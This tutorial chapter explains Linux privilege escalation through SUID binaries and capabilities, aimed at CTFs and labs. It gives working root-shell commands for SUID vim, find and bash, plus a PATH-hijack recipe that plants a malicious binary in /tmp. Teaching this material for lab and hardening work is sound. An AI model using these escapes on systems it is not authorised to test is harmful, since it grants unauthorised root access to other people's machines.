# 04. SUID and Capabilities Abuse

## Overview

SUID (Set User ID) and Linux capabilities are mechanisms that allow binaries to run with elevated privileges. When misconfigured, they become powerful privilege escalation vectors.

Unlike `sudo`, which is explicit delegation, SUID and capabilities often grant privilege **implicitly**, making them harder to notice during initial enumeration.

---

## 1. SUID Fundamentals

### What is SUID?

When a binary has the SUID bit set, it runs with the privileges of the file owner (often root), not the executing user.

### Find SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

---

### Example output:

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/vim.basic
/usr/local/bin/custom_backup
```

---

## 2. Identifying Dangerous SUID Binaries

Not all SUID binaries are exploitable. Focus on:

* Editors (vim, nano)
* Interpreters (python, perl, ruby)
* File manipulation tools (cp, mv, find)
* Archiving tools (tar, zip)
* Custom binaries in `/usr/local/bin`

---

## 3. SUID Exploitation Patterns

### 3.1 GTFOBins-based Escalation

If a SUID binary exists in GTFOBins, it may allow shell escape.

#### Example: SUID vim

```bash
./vim -c ':!sh'
```

If vim is SUID root:

➡ Root shell

---

#### Example: SUID find

```bash
./find . -exec /bin/sh \; -quit
```

➡ Executes shell as root

---

#### Example: SUID bash

```bash
./bash -p
```

➡ Preserves privileges → root shell

---

## 4. Custom SUID Binaries (High Value Targets)

Custom binaries are more dangerous than system binaries.

### Check permissions:

```bash
ls -la /usr/local/bin
```

If you see:

```text
-rwsr-xr-x 1 root root 14000 Jun 6 custom_backup
```

The `s` means SUID is active.

---

### Exploitation logic:

Ask:

* Does it call system commands?
* Does it use relative paths?
* Does it accept user input?
* Does it load external files?

If yes → potential privilege escalation.

---

## 5. Path Hijacking via SUID Binaries

If a SUID binary calls system utilities like:

```text
ls
cp
tar
```

without full paths, attacker can hijack PATH.

### Example:

```bash
export PATH=/tmp:$PATH
```

Create malicious binary:

```bash
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
```

Run SUID program → executes attacker-controlled binary.

---

## 6. Linux Capabilities Abuse

Capabilities provide fine-grained privileges without full root.

### List capabilities:

```bash
getcap -r / 2>/dev/null
```

---

### Example output:

```text
/usr/bin/python3 = cap_setuid+ep
```

---

## 7. Real-World Privilege Escalation Chains

### Chain 1: SUID binary → shell

1. Find SUID vim
2. Execute escape command
3. Gain root shell

---

### Chain 2: Custom SUID → PATH hijack

1. Identify custom binary
2. Discover insecure system calls
3. Hijack PATH
4. Execute malicious binary as root

---

### Chain 3: Capabilities → direct root

1. Find python with ``cap_setuid``
2. Execute privilege change
3. Spawn root shell

---

## Summary

SUID and capabilities are powerful because:

> They grant elevated privileges at execution time without requiring authentication.

They are one of the most consistent privilege escalation vectors in Linux systems, especially in CTFs, labs, and poorly hardened servers.
